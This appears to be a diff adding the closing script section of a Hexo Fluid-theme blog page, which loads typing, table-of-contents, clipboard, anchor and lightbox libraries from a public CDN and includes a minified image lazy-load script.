+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+
+        <style>
+            [bg-lazy] {
+                background-image: none !important;
+                background-color: #eee !important;
+            }
+        </style>
+        <script>
+            window.imageLazyLoadSetting = {
+                isSPA: false,
+                preloadRatio: 1,
+                processImages: null,
+            };
+        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z\d\-\.\+]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(t.test(e.href)||r.test(e.href))&&(e.href=a.dataset.original)})});</script><script>(r=>{r.imageLazyLoadSetting.processImages=t;var a=r.imageLazyLoadSetting.isSPA,o=r.imageLazyLoadSetting.preloadRatio||1,d=i();function i(){var t=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")),e=Array.prototype.slice.call(document.querySelectorAll("[bg-lazy]"));return t.concat(e)}function t(t){(a||t)&&(d=i());for(var e,n=0;n<d.length;n++)0<=(e=(e=d[n]).getBoundingClientRect()).bottom&&0<=e.left&&e.top<=(r.innerHeight*o||document.documentElement.clientHeight*o)&&(()=>{var t,e,a,o,i=d[n];e=function(){d=d.filter(function(t){return i!==t}),r.imageLazyLoadSetting.onImageLoaded&&r.imageLazyLoadSetting.onImageLoaded(i)},(t=i).dataset.loaded||(t.hasAttribute("bg-lazy")?(t.removeAttribute("bg-lazy"),e&&e()):(a=new Image,o=t.getAttribute("data-original"),a.onload=function(){t.src=o,t.removeAttribute("data-original"),t.setAttribute("data-loaded",!0),e&&e()},a.onerror=function(){t.removeAttribute("data-original"),t.setAttribute("data-loaded",!1),t.src=o},t.src!==o&&(a.src=o)))})()}function e(){clearTimeout(t.tId),t.tId=setTimeout(t,500)}t(),document.addEventListener("scroll",e),r.addEventListener("resize",e),r.addEventListener("orientationchange",e)})(this);</script></body>
+</html>
